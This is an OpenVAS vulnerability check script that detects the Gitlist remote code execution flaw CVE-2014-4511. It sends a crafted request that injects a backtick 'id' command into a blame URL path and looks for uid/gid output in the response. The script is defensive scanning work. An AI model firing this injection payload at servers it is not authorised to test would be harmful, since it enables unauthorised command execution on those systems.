###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_gitlist_rce_06_14.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Gitlist Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105052");
  script_cve_id("CVE-2014-4511");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11867 $");
  script_name("Gitlist Remote Code Execution Vulnerability");
  script_xref(name:"URL", value:"http://hatriot.github.io/blog/2014/06/29/gitlist-rce/");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-06-30 13:00:23 +0200 (Mon, 30 Jun 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successfully exploiting this issue allows attackers to execute
arbitrary code in the context of the affected application.");
  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
  script_tag(name:"insight", value:"An anonymous user could execute commands because of a
complete lack of input sanitizatioin");
  script_tag(name:"solution", value:"Update to Gitlist >= 0.5.0");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Gitlist is prone to remote code execution vulnerability.");
  script_tag(name:"affected", value:"Gitlist <= 0.4.0");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

foreach dir( make_list_unique( "/gitlist", "/git", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/";
  buf = http_get_cache( item:url, port:port );

  if( egrep( pattern:"Powered by.*GitList", string:buf ) ) {
    repos = eregmatch( pattern:'class="icon-folder-open icon-spaced"></i> <a href="([^"]+)">', string:buf );
    if( isnull( repos[1] ) ) continue;

    repo = repos[1];

    url = repo + 'blame/master/""</%60id%60';
    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( buf =~ "uid=[0-9]+.*gid=[0-9]+" ) {
      req_resp = 'Request:\n' + req + '\nResponse:\n' + buf;
      security_message( port:port, expert_info:req_resp );
      exit( 0 );
    }
  }
}

exit( 99 );
